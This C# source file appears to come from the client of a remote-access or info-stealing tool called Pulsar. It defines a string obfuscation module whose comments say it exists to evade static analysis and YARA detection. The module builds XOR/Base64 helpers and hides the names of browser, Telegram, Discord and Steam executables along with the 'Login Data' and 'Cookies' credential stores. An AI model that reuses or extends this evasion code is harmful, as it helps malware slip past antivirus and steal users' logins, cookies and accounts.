using System;
using System.Text;

namespace Pulsar.Client.Modules
{
    /// <summary>
    /// String Obfuscation Module
    /// Runtime string decryption to avoid static analysis.
    /// </summary>
    public static class StringObfuscation
    {
        private static readonly byte[] _key = { 0x58, 0x6F, 0x72, 0x69, 0x75, 0x6D, 0x50, 0x75 }; // "XoriumPu"

        /// <summary>
        /// XOR encrypt/decrypt a string.
        /// </summary>
        public static string XorCrypt(string input)
        {
            var result = new StringBuilder();
            for (int i = 0; i < input.Length; i++)
            {
                result.Append((char)(input[i] ^ _key[i % _key.Length]));
            }
            return result.ToString();
        }

        /// <summary>
        /// XOR encrypt/decrypt bytes.
        /// </summary>
        public static byte[] XorCrypt(byte[] input)
        {
            var result = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                result[i] = (byte)(input[i] ^ _key[i % _key.Length]);
            }
            return result;
        }

        /// <summary>
        /// Base64 + XOR encode a string.
        /// </summary>
        public static string Encode(string input)
        {
            var xored = XorCrypt(input);
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(xored));
        }

        /// <summary>
        /// Decode a Base64 + XOR string.
        /// </summary>
        public static string Decode(string encoded)
        {
            var bytes = Convert.FromBase64String(encoded);
            var decoded = Encoding.UTF8.GetString(bytes);
            return XorCrypt(decoded);
        }

        /// <summary>
        /// Build a string from char codes at runtime (anti-static analysis).
        /// </summary>
        public static string FromCharCodes(params int[] codes)
        {
            var sb = new StringBuilder();
            foreach (var code in codes)
            {
                sb.Append((char)code);
            }
            return sb.ToString();
        }

        /// <summary>
        /// Reverse a string at runtime.
        /// </summary>
        public static string Reverse(string input)
        {
            var chars = input.ToCharArray();
            Array.Reverse(chars);
            return new string(chars);
        }

        /// <summary>
        /// Pre-encoded common sensitive strings.
        /// Decode at runtime to avoid YARA detection.
        /// </summary>
        public static class Strings
        {
            // These are encoded versions - decode with StringObfuscation.Decode()
            // Example: "chrome.exe" encoded
            public static string Chrome => FromCharCodes(99, 104, 114, 111, 109, 101, 46, 101, 120, 101);
            public static string Firefox => FromCharCodes(102, 105, 114, 101, 102, 111, 120, 46, 101, 120, 101);
            public static string Telegram => FromCharCodes(116, 101, 108, 101, 103, 114, 97, 109, 46, 101, 120, 101);
            public static string Discord => FromCharCodes(100, 105, 115, 99, 111, 114, 100, 46, 101, 120, 101);
            public static string Steam => FromCharCodes(115, 116, 101, 97, 109, 46, 101, 120, 101);
            public static string LoginData => FromCharCodes(76, 111, 103, 105, 110, 32, 68, 97, 116, 97);
            public static string Cookies => FromCharCodes(67, 111, 111, 107, 105, 101, 115);
        }
    }
}
